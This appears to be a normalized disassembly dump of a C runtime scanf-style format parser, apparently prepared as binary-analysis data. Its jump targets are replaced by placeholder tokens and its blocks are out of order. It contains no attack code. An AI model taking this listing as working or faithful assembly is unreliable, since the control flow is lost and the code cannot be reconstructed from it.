cmp [ ebp - 0x1a4 ] 0x78
mov [ ebp - 0x1a8 ] 0x1
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_202343c
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x195 ] 0x0
je r-xdata
mov eax [ ebp - 0x1cc ]
mov [ esi ] eax
mov eax [ ebp - 0x1c8 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1a8 ]
cmp [ ebp - 0x1b4 ] 0x0
mov eax [ ebp - 0x188 ]
lea edi [ edi + eax - 0x30 ]
je r-xdata
shl edi 0x3
jmp r-xdata
mov eax [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
add eax 0xffffffd0
cdq
add esi eax
adc edi edx
cmp [ ebp - 0x1b4 ] 0x0
mov [ ebp - 0x1cc ] esi
mov [ ebp - 0x1c8 ] edi
je r-xdata
mov esi [ ebp - 0x1cc ]
mov edi [ ebp - 0x1c8 ]
shld edi esi 0x3
shl esi 0x3
jmp r-xdata
mov [ ebp - 0x1bc ] esi
jmp r-xdata
inc bl
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push eax
call sub_20161f3
pop ecx
pop ecx
mov [ ebp - 0x188 ] esi
jmp r-xdata
cmp [ ebp - 0x1b4 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1f8 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x19f ] al
cmp al [ ebp - 0x188 ]
jne r-xdata
mov [ esi ] di
mov [ esi ] edi
jmp r-xdata
mov [ ebp - 0x1a4 ] 0x6f
jmp r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
test dl dl
je r-xdata
mov [ ebp - 0x1b8 ] esi
mov esi [ ebp - 0x1bc ]
jmp r-xdata
mov al [ ebp - 0x188 ]
mov ecx [ ebp - 0x1ac ]
inc [ ebp - 0x1a8 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_20171c3
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1a8 ] 0x0
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
inc bl
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
movzx eax al
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_20161f3
cmp [ ebp - 0x1a8 ] 0x0
pop ecx
pop ecx
je r-xdata
cmp [ ebp - 0x188 ] 0x65
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov ecx [ ebp - 0x1ac ]
mov [ ebp - 0x188 ] eax
mov al [ ebp - 0x19f ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_20171c3
add esp 0xc
test eax eax
je r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
cmp [ ebp - 0x188 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
mov al dl
mov dl cl
mov al cl
jmp r-xdata
mov eax [ ebp - 0x1ac ]
inc [ ebp - 0x1c4 ]
lea ecx [ ebp - 0x1f8 ]
push ecx
push eax
push [ ebp - 0x1bc ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x195 ]
dec eax
push eax
push [ rw-data ]
call sub_200d4ca
pop ecx
call eax
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x1ac ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_20171c3
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_202343c
pop ecx
test eax eax
jne r-xdata
xor dl dl
jmp r-xdata
sub al dl
inc al
movzx edi dl
movzx edx al
cmp dl al
ja r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1ac ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_20171c3
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1ac ]
mov cl [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_20171c3
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
movzx eax al
push eax
call sub_202343c
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
and [ ebp - 0x194 ] eax
jmp r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1ac ]
mov cl [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_20171c3
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
movzx eax al
sub_20171c3
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_201aa7d
add esp 0xc
test eax eax
je r-xdata
call sub_201a9e3
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_2013e10
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_201721a
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_202343c
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_201723a
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_2023541
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_20161dd
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_2017264
mov edi edi
push ebp
mov ebp esp
sub esp 0x200
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x1e0 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x19c ] eax
mov [ ebp - 0x1ac ] edi
mov [ ebp - 0x1a4 ] ecx
mov [ ebp - 0x1d8 ] 0x15e
mov [ ebp - 0x1d0 ] esi
mov [ ebp - 0x1ec ] esi
mov [ ebp - 0x188 ] esi
mov [ ebp - 0x1f0 ] esi
cmp edi esi
jne r-xdata
cmp eax esi
je r-xdata
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_200b53e
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x200 ]
call sub_20099ee
mov al [ edi ]
mov [ ebp - 0x19d ] 0x0
mov [ ebp - 0x18c ] esi
mov [ ebp - 0x1c4 ] esi
test al al
je r-xdata
push eax
call sub_20134c9
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1f4 ] 0x0
je r-xdata
movzx eax al
push eax
call sub_2023541
pop ecx
test eax eax
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1c4 ]
mov eax [ ebp - 0x1f8 ]
and [ eax + 0x70 ] 0xfffffffd
mov esi [ ebp - 0x1ac ]
mov al [ esi ]
cmp al 0x25
jne r-xdata
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x19c ]
lea esi [ ebp - 0x18c ]
call sub_201723a
pop ecx
push eax
call sub_20161f3
mov esi [ ebp - 0x1ac ]
pop ecx
pop ecx
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov edi [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
mov edx edi
call sub_20161dd
mov ebx eax
movzx eax [ esi ]
inc esi
mov [ ebp - 0x188 ] ebx
mov [ ebp - 0x1ac ] esi
cmp eax ebx
jne r-xdata
cmp [ esi + 0x1 ] al
je r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_2023541
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x1ac ] esi
jmp r-xdata
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
push edi
push ebx
jmp r-xdata
movzx eax bl
push eax
call sub_20145cd
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor edi edi
mov [ ebp - 0x1c8 ] edi
mov [ ebp - 0x1d1 ] 0x0
mov [ ebp - 0x1a8 ] edi
mov [ ebp - 0x1c0 ] edi
mov [ ebp - 0x194 ] edi
mov [ ebp - 0x1cc ] edi
mov [ ebp - 0x19e ] 0x0
mov [ ebp - 0x19f ] 0x0
mov [ ebp - 0x18f ] 0x0
mov [ ebp - 0x18d ] 0x0
mov [ ebp - 0x196 ] 0x0
mov [ ebp - 0x18e ] 0x0
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x1b0 ] edi
mov al [ esi ]
test al al
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
call sub_20161f3
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x188 ] 0xffffffff
jne r-xdata
inc [ ebp - 0x18c ]
mov edx edi
call sub_20161dd
movzx ecx [ esi ]
inc esi
mov [ ebp - 0x1ac ] esi
cmp ecx eax
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x25
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x194 ]
inc [ ebp - 0x1c0 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x194 ] eax
jmp r-xdata
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
cmp [ esi ] 0x25
jne r-xdata
push edi
push eax
call sub_20161f3
push edi
push ebx
call sub_20161f3
add esp 0x10
dec [ ebp - 0x18c ]
mov esi eax
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x18d ] 0x0
je r-xdata
cmp [ ebp - 0x188 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1a4 ]
call sub_2009d98
pop ecx
mov eax [ ebp - 0x1ac ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
dec [ ebp - 0x195 ]
dec [ ebp - 0x18e ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc esi
movzx ebx [ esi ]
movzx eax bl
push eax
call sub_202343c
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x18f ] 0x0
mov [ ebp - 0x1ac ] esi
jne r-xdata
cmp [ ebp - 0x1f0 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1c4 ]
test eax eax
jne r-xdata
mov esi eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x18f ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x1e0 ]
mov ebx [ eax ]
mov [ ebp - 0x1e8 ] eax
add eax 0x4
mov [ ebp - 0x1e0 ] eax
jmp r-xdata
call sub_200fb13
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x1f4 ] 0x0
je r-xdata
cmp [ ebp - 0x19d ] al
jne r-xdata
inc [ ebp - 0x1b0 ]
mov esi eax
mov [ ebp - 0x1b8 ] edi
mov [ ebp - 0x1b4 ] edi
jmp r-xdata
inc [ ebp - 0x195 ]
inc [ ebp - 0x18e ]
jmp r-xdata
inc [ ebp - 0x18d ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx edi [ esi ]
or edi 0x20
mov [ ebp - 0x1e4 ] edi
cmp edi 0x6e
je r-xdata
mov al [ esi ]
cmp al 0x53
je r-xdata
cmp [ ebp - 0x18e ] 0x0
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x18d ] 0x0
jne r-xdata
mov ecx [ ebp - 0x1f8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
mov cl [ esi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1c0 ]
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
mov [ ebp - 0x18e ] 0x1
mov [ ebp - 0x18e ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x195 ]
jmp r-xdata
cmp [ ebp - 0x18f ] 0x0
jne r-xdata
cmp [ ebp - 0x194 ] 0x0
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
cmp edi 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
cmp edi 0x6f
jg r-xdata
cmp edi 0x63
je r-xdata
push [ ebp - 0x19c ]
push [ ebp - 0x188 ]
mov ebx [ ebp - 0x1bc ]
mov esi [ ebp - 0x1ac ]
push [ ebp - 0x19c ]
lea esi [ ebp - 0x18c ]
call sub_201723a
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov esi eax
jmp r-xdata
mov eax edi
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ ebp - 0x1e8 ]
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x1e8 ] eax
add eax 0x4
mov [ ebp - 0x1e0 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x1cc ] eax
cmp eax 0x1
jb r-xdata
cmp edi 0x73
je r-xdata
mov [ ebp - 0x188 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
mov [ ebp - 0x195 ] 0x1
sub eax 0x3
je r-xdata
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x18e ] 0x0
jle r-xdata
cmp edi 0x7b
jne r-xdata
cmp cl 0x78
je r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov [ ebp - 0x19f ] 0x1
jmp r-xdata
cmp [ ebp - 0x18e ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
cmp edi 0x64
je r-xdata
mov [ ebx ] 0x0
xor eax eax
mov [ ebx ] ax
jmp r-xdata
cmp cl 0x58
jne r-xdata
cmp [ ebp - 0x1b0 ] 0x0
je r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
mov esi [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push esi
push [ ebp - 0x188 ]
mov [ ebp - 0x1b0 ] ebx
call sub_20161f3
pop ecx
pop ecx
cmp edi 0x63
je r-xdata
mov [ ebp - 0x196 ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x194 ]
mov [ ebp - 0x1c0 ] 0x1
jle r-xdata
call sub_200fb13
mov [ eax ] 0xc
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
dec [ ebp - 0x1cc ]
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ esi ]
cmp eax [ ebp - 0x188 ]
jne r-xdata
cmp edi 0x67
jle r-xdata
cmp [ ebp - 0x19f ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
cmp [ ebp - 0x19f ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
inc [ ebp - 0x18c ]
mov edx esi
call sub_20161dd
mov [ ebp - 0x188 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov [ ebp - 0x19f ] 0x1
jmp r-xdata
cmp [ ebp - 0x18e ] 0x0
jle r-xdata
push [ ebp - 0x19c ]
push [ ebp - 0x188 ]
call sub_20161f3
pop ecx
pop ecx
mov [ ebp - 0x1f0 ] 0x1
jmp r-xdata
dec [ ebp - 0x19d ]
cmp [ ebp - 0x18f ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
cmp edi 0x69
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov eax [ ebp - 0x1c8 ]
neg eax
jmp r-xdata
movzx eax [ ebp - 0x188 ]
push eax
call sub_20234c0
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
movzx eax [ ebp - 0x188 ]
push eax
call sub_20234c0
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
dec [ ebp - 0x18c ]
push esi
push eax
call sub_20161f3
pop ecx
pop ecx
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x1b0 ] ebx
je r-xdata
cmp [ ebp - 0x188 ] 0x30
jne r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
inc esi
cmp [ esi ] 0x5e
jne r-xdata
mov [ ebp - 0x196 ] 0x1
mov esi [ ebp - 0x1ac ]
inc [ ebp - 0x19d ]
inc esi
mov [ ebp - 0x1ac ] esi
jmp r-xdata
mov eax [ ebp - 0x1e8 ]
mov [ ebp - 0x1e0 ] eax
jmp r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
push 0x64
pop edi
cmp edi 0x6e
jne r-xdata
cmp [ ebp - 0x1a8 ] 0x0
je r-xdata
and [ ebp - 0x1a8 ] 0x0
cmp edi 0x46
jne r-xdata
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_20161f3
pop ecx
pop ecx
push [ ebp - 0x188 ]
shl [ ebp - 0x1c8 ] 0x4
call sub_201721a
mov [ ebp - 0x188 ] eax
mov eax [ ebp - 0x1c8 ]
pop ecx
movzx eax [ ebp - 0x188 ]
push eax
call sub_202343c
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_20161f3
pop ecx
pop ecx
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
push [ ebp - 0x188 ]
shld ecx eax 0x4
shl eax 0x4
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
call sub_201721a
pop ecx
mov [ ebp - 0x188 ] eax
movzx eax [ ebp - 0x188 ]
push eax
call sub_202343c
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x18f ] 0x0
jne r-xdata
cmp [ ebp - 0x18f ] 0x0
jne r-xdata
cmp edi 0x73
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
cmp al 0x78
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_2013580
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
inc esi
mov [ ebp - 0x19e ] 0xff
cmp [ ebp - 0x1c0 ] 0x0
jne r-xdata
dec [ ebp - 0x194 ]
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
cmp [ ebp - 0x18f ] 0x0
mov eax [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x18f ] 0x0
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
jmp r-xdata
dec [ ebp - 0x194 ]
je r-xdata
cmp edi 0x6f
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
jmp r-xdata
dec [ ebp - 0x194 ]
je r-xdata
cmp edi 0x6f
jne r-xdata
inc [ ebp - 0x1c4 ]
cmp edi 0x63
je r-xdata
inc [ ebp - 0x1b0 ]
jmp r-xdata
cmp [ ebp - 0x1cc ] 0x0
je r-xdata
cmp edi 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
cmp [ ebp - 0x1c0 ] 0x0
mov [ ebp - 0x188 ] eax
je r-xdata
cmp al 0x58
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
or [ ebp - 0x194 ] 0xffffffff
cmp [ ebp - 0x1b0 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1c4 ]
mov ebx [ ebp - 0x1bc ]
mov eax [ ebp - 0x1c8 ]
imul eax eax 0xa
jmp r-xdata
cmp [ ebp - 0x188 ] 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1b4 ]
push [ ebp - 0x1b8 ]
call sub_2021790
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] edx
jmp r-xdata
cmp [ ebp - 0x188 ] 0x38
jge r-xdata
cmp [ ebp - 0x196 ] 0x0
je r-xdata
call sub_200fb13
cmp [ ebp - 0x196 ] 0x0
mov [ eax ] 0xc
je r-xdata
cmp [ ebp - 0x196 ] 0x0
je r-xdata
movsx edi [ ebp - 0x19e ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx edi
mov edi [ ebp - 0x1e4 ]
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
push 0x78
sub [ ebp - 0x194 ] 0x2
cmp [ ebp - 0x194 ] 0x1
jge r-xdata
mov [ ebp - 0x1a8 ] 0x1
cmp edi 0x78
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_202343c
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x195 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov [ ebx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ ebx + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
cmp [ ebp - 0x1c0 ] 0x0
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x1c8 ] eax
je r-xdata
mov eax [ ebp - 0x1c8 ]
shl eax 0x3
jmp r-xdata
mov eax [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
add eax 0xffffffd0
cdq
add [ ebp - 0x1b8 ] eax
adc [ ebp - 0x1b4 ] edx
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
shld ecx eax 0x3
shl eax 0x3
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x1bc ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1bc ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
mov eax [ ebp - 0x1b0 ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1b0 ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
mov [ ebx ] al
inc ebx
mov [ ebp - 0x1dc ] al
movzx eax al
push eax
call sub_20145cd
pop ecx
test eax eax
je r-xdata
inc [ ebp - 0x18d ]
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_20161f3
pop ecx
pop ecx
mov [ ebp - 0x188 ] 0x30
jmp r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x200 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x19e ] al
cmp al [ ebp - 0x188 ]
jne r-xdata
mov [ ebx ] ax
mov [ ebx ] eax
jmp r-xdata
lea eax [ ebp - 0x200 ]
push eax
mov eax [ ebp - 0x200 ]
mov [ ebp - 0x1ec ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1dc ]
push eax
lea eax [ ebp - 0x1ec ]
push eax
call sub_2022c57
mov ax [ ebp - 0x1ec ]
add esp 0x10
mov [ ebx ] ax
inc ebx
inc ebx
jmp r-xdata
inc [ ebp - 0x18c ]
mov edx esi
call sub_20161dd
mov [ ebp - 0x1db ] al
push 0x6f
jmp r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
mov edi [ ebp - 0x1e4 ]
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
test dl dl
je r-xdata
mov ebx [ ebp - 0x1bc ]
mov [ ebp - 0x1ac ] esi
jmp r-xdata
mov al [ ebp - 0x188 ]
mov ecx [ ebp - 0x1a4 ]
inc [ ebp - 0x1a8 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a4 ]
lea esi [ ebp - 0x1d8 ]
call sub_20171c3
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1a8 ] 0x0
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov [ ebp - 0x1bc ] ebx
jmp r-xdata
pop edi
jmp r-xdata
inc [ ebp - 0x18d ]
